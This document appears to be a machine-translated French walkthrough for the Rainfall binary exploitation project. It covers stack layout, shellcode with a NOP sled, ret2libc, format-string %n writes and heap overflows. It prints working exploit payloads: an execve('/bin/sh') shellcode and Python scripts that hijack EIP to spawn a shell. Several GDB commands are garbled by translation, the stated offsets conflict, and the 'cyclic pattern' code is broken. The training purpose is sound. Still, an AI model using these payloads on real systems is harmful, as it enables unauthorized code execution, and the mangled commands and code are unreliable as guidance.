# Introduction :

Des vulnérabilités de corruption de mémoire se produisent lorsqu'un programme gère de manière incorrecte les écritures de données, permettant à un attaquant d'écraser des sections critiques de la mémoire système. Lorsqu'il est exploité sur la pile d'appels, un attaquant peut écraser l'adresse de retour enregistrée (EIP), prenant ainsi le contrôle du flux d'exécution du programme. C'est dans les Rainfall que cette théorie devient pratique : chaque niveau est un binaire C compilé, et chaque binaire a un défaut qui attend d'être découvert et utilisé comme arme.

# Objectifs du projet :

Rainfall est un projet 1337 qui approfondit les concepts introduits dans Snowcrash. L'accent est entièrement mis sur l'exploitation binaire sur une architecture x86 32 bits. Vous devez analyser les binaires C vulnérables, identifier les failles telles que les débordements de tampon et les vulnérabilités de chaîne de format, et créer des exploits spécifiques pour rediriger l'exécution – soit vers le shellcode injecté, soit vers les fonctions de bibliothèque existantes (ret2libc) – pour générer un shell et exécuter `getflag`.

# La pile d'appels x86 :

Comprendre la disposition de la pile est essentiel avant toute tentative d'exploitation. Lorsqu'une fonction est appelée sur x86 32 bits :

Adresses supérieures ┌─────────────────────┐ │ arguments de fonction │ ← poussés par l'appelant avant CALL ├─────────────────────┤ │ EIP enregistré (adresse ret)│ ← poussé par l'instruction CALL ├─────────────────────┤ │ EBP enregistré │ ← poussé par la fonction prologue (push ebp) ├─────────────────────┤ │ variables locales │ ← allouées par "sub esp, N" │ [tampon ici] │ └─────────────────────┘ ← Points ESP ici (haut de la pile = adresse basse) Adresses inférieures

Le dépassement du `buffer` local vers le haut écrase l'EBP enregistré, puis l'EIP enregistré - qui est lu par l'instruction `ret` pour savoir où sauter ensuite.

# Procédure pas à pas :

:one : Configuration initiale et démontage :

Connectez-vous via SSH à la machine virtuelle Rainfall. Lors de l'accès à un niveau, utilisez GDB avec la syntaxe Intel pour démonter le binaire cible. Le premier objectif est d'identifier les fonctions dangereuses : `gets`, `strcpy`, `scanf`, `printf` appelées sans spécificateur de format.

$ gdb -q ./level0 (gdb) définir les fonctions d'information Intel (gdb) à saveur de désassemblage # lister toutes les fonctions (rechercher les fonctions personnalisées) (gdb) démonter main (gdb) démonter vulnérabilité_func

# Depuis l'extérieur de GDB, reconnaissance statique rapide : $ strings ./level0 | grep -E "/bin|flag|pass|auth" $ objdump -d -M intel ./level0 | grep -A 5 "call.*gets\|call.*strcpy"

:deux : Détermination du décalage de débordement de tampon :

Le décalage est le nombre d'octets de remplissage nécessaires avant la valeur de 4 octets qui écrasera l'EIP enregistré.

**Méthode 1 — Calcul manuel à partir du démontage :**

(gdb) démonter principal ; Recherchez : sub esp, 0x58 → 88 octets d'espace local ; L'EBP enregistré est 4 octets au-dessus des paramètres locaux → offset = 88 + 4 = 92

**Méthode 2 — Modèle cyclique (le plus fiable) :**

# Générez un motif cyclique avec GDB-PEDA ou manuellement : $ python3 -c " import string chars = string.ascii_lowercase pat = ''.join(chars[i:i+4]*4 for i in range(0, len(chars), 4)) print(pat[:200])"

(gdb) run <<< $(python3 -c "print('A'*200)") # Le programme plante avec EIP = 0x41414141 ou un sous-modèle

# Puis affiner : (gdb) run <<< $(python3 -c "print('A'*80 + 'BBBB')") # Si EIP = 0x42424242 → le décalage est exactement de 80

:trois : Création et injection de shellcode :

Lorsque la pile est exécutable (pas de bit NX), injectez le code machine directement dans le tampon et redirigez-y EIP.

**Shellcode Linux x86 classique `execve("/bin/sh")` (23 octets) :**

\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e \x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80

Cela correspond à : xor eax, eax push eax ; terminateur nul push 0x68732f2f ; "//sh" poussez 0x6e69622f ; "/bin" mov ebx, esp ; ebx → "/bin//sh" pousser eax ; envp = NULL pousser ebx ; argv[0] = "/bin//sh" mov ecx, esp ; ecx → argv mov al, 0xb ; numéro d'appel système exécutif int 0x80

**Traîneau NOP + charge utile du shellcode :**

$ python3 -c " import struct offset = 76 nop = b'\x90' * 50 shellcode= b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' eip = struct.pack('<I', 0xbffff700) # adresse dans NOP sled padding = b'A' * (offset - len(nop) - len(shellcode)) print((nop + shellcode + padding + eip).decode('latin-1'))" | ./niveauXX

Recherchez l'adresse de pile à cibler à l'aide de GDB : définissez un point d'arrêt sur la fonction vulnérable et inspectez `$esp` :

(gdb) break *0x08048450 (gdb) run <<< $(python3 -c "print('A'*80)") (gdb) x/40x $esp

4️⃣ Retour à la libc (ret2libc) :

Lorsque la pile est non exécutable (bit NX défini), le shellcode injecté sur la pile déclenchera une erreur de segmentation. Au lieu de cela, écrasez EIP avec l'adresse `system()` de la libc, suivie d'une fausse adresse de retour, suivie d'un pointeur vers la chaîne `"/bin/sh"` (qui existe déjà dans la libc).

# Trouver les adresses au moment de l'exécution : (gdb) break main (gdb) run (gdb) print system → $1 = 0xb7e6b060 (gdb) find &system, +9999999, "/bin/sh" → 0xb7f8cc58 (gdb) info symbol 0xb7e5ebe0 # trouver l'adresse exit() pour un faux ret propre

$ python3 -c " import struct offset = 76 system_addr = struct.pack('<I', 0xb7e6b060) exit_addr = struct.pack('<I', 0xb7e5ebe0) # fausse adresse de retour binsh_addr = struct.pack('<I', 0xb7f8cc58) payload = b'A' * offset + system_addr + exit_addr + binsh_addr import sys; sys.stdout.buffer.write(payload)" | ./niveauXX

La disposition de la pile que la charge utile construit :

[ remplissage (76 octets) ] [ system() ] [ exit() ] [ ptr vers "/bin/sh" ] ↑ EIP ↑ ret ↑ argument

5️⃣ Exploitation des vulnérabilités des chaînes de format :

Lorsque l'entrée utilisateur est transmise directement comme argument de format à `printf`, l'attaquant contrôle la chaîne de format.

**Lecture de la pile (divulgation d'informations) :**

$ écho "%08x.%08x.%08x.%08x.%08x" | ./levelXX bffff640.00000000.b7fd1ac0.b7ff37d4.41414141

Chaque `%08x` supprime une valeur de 4 octets de la liste des arguments printf, révélant le contenu de la pile. Comptez la position pour trouver où commence votre tampon d'entrée sur la pile (le "décalage de chaîne de format").

**Écrire avec `%n` :**

`%n` écrit le nombre d'octets imprimés jusqu'à présent à l'adresse pointée par l'argument correspondant. Cela permet des écritures arbitraires en plaçant une adresse cible dans l'entrée et en utilisant `%n` à la bonne position.

# Remplacer l'adresse 0x08049828 par la valeur 0x42 (66 décimales) # En supposant que le décalage de la chaîne de format est de 4 : $ python3 -c " import struct target = struct.pack('<I', 0x08049828) # Adresse à écraser (par exemple, entrée GOT) # Imprimer 66 - 4 = 62 caractères, puis %4\$n pour écrire en position 4 sur le charge utile de la pile = cible + b'%62d' + b'%4\$n' import sys; sys.stdout.buffer.write(payload)" | ./niveauXX

Pour les écritures complexes (grandes valeurs, écritures sur 2 octets), utilisez le spécificateur `%hn` (écritures sur 2 octets) pour diviser une adresse de 4 octets en deux écritures distinctes de 2 octets.

:six : Débordements de tampon basés sur le tas :

Certains niveaux allouent des tampons sur le tas à l'aide de `malloc`. Un débordement de tas écrase les métadonnées du tas adjacent ou les morceaux alloués adjacents, corrompant potentiellement les pointeurs de fonction stockés sur le tas.

# Modèle vulnérable typique : char *buf = malloc(64);     obtient(buf);   // déborde du morceau de tas

Utilisez GDB pour inspecter la disposition du tas :

(gdb) break malloc (gdb) run (gdb) x/40x 0x0804b000 # inspecter la région du tas après l'allocation

Identifiez ce qui se trouve à côté du tampon débordé : un pointeur de fonction, un pointeur de flux `FILE*` ou un pointeur de table virtuelle sont tous des cibles de grande valeur.

# Questions et réponses

:question : Qu'est-ce que le pointeur d'instruction (EIP/RIP) et pourquoi son écrasement est-il puissant ?

> Le pointeur d'instruction est un registre CPU qui contient l'adresse mémoire de la **prochaine instruction** que le processeur exécutera. Après chaque instruction `ret`, le processeur extrait l'EIP enregistré de la pile et y accède. Si un attaquant a écrasé cet emplacement de pile avec une adresse de son choix (via un débordement de tampon), l'exécution continue à partir de sa cible, qui peut être un shellcode, une fonction libc ou un gadget ROP.

:question : Pourquoi la fonction `gets()` est-elle universellement dangereuse ?

> `gets()` lit les caractères de stdin et les stocke dans un tampon jusqu'à ce qu'il rencontre une nouvelle ligne ou un EOF, effectuant une **vérification sans limites**. Il n'existe aucune version de `gets()` qui soit sûre — il n'y a aucun moyen de lui indiquer la taille du tampon. Il a été obsolète dans C99 et entièrement supprimé de C11. Tout binaire appelant `gets()` est trivialement vulnérable à un débordement de tampon de pile.

:question : Qu'est-ce qu'un traîneau NOP et pourquoi est-il utilisé ?

> Un traîneau NOP (`\x90`) est une séquence d'instructions de non-opération placée avant le shellcode dans une charge utile d'exploit. Étant donné que les adresses de pile varient légèrement d'une exécution à l'autre (en raison des différentes longueurs des variables d'environnement, `LD_PRELOAD`, etc.), il suffit de pointer EIP n'importe où dans le traîneau NOP - le processeur exécute chaque instruction NOP dans l'ordre et "glisse" directement dans le shellcode. Un traîneau plus grand augmente la probabilité de réussite.

:question : Comment ret2libc contourne-t-il la protection NX (No-Execute) ?

> NX marque les pages de pile et de tas comme non exécutables au niveau MMU du processeur. Toute tentative d'accès et d'exécution de code sur la pile provoque une panne matérielle immédiate. ret2libc contourne cela en n'exécutant jamais de **nouveau** code — au lieu de cela, il redirige EIP vers le début de `system()`, qui réside déjà dans une page exécutable légitime (libc). L'exploit réutilise le code existant déjà en mémoire, le bit NX n'est donc pas pertinent.

:question : Comment trouvez-vous le décalage de votre entrée de chaîne de format sur la pile ?

> Envoyez un modèle reconnaissable dans votre entrée (par exemple, `AAAA` = `0x41414141`) suivi de plusieurs spécificateurs `%08x`. Comptez le nombre de jetons `%08x` dont vous avez besoin avant que `41414141` n'apparaisse dans la sortie - ce nombre correspond au décalage de la chaîne de format. Avec la syntaxe `%N$x`, vous pouvez référencer directement la position N sur la pile, rendant l'exploitation précise et déterministe.

:question : Quelle est la différence entre un débordement de pile et un débordement de tas ?

> Un **débordement de pile** corrompt la trame d'appel de fonction - en particulier l'EBP enregistré et l'EIP enregistré - donnant un contrôle direct et précis sur l'adresse de retour et donc sur la prochaine instruction exécutée. Un **débordement de tas** corrompt les morceaux de tas adjacents ou les métadonnées intégrées (champs de taille, pointeurs de liste libre avant/arrière). La primitive d'exploitation est moins directe : elle nécessite généralement de corrompre les structures du tas d'une manière qui conduit à une écriture arbitraire (par exemple, l'exploit de dlmalloc unlink classique) ou d'écraser un pointeur de fonction stocké sur le tas.
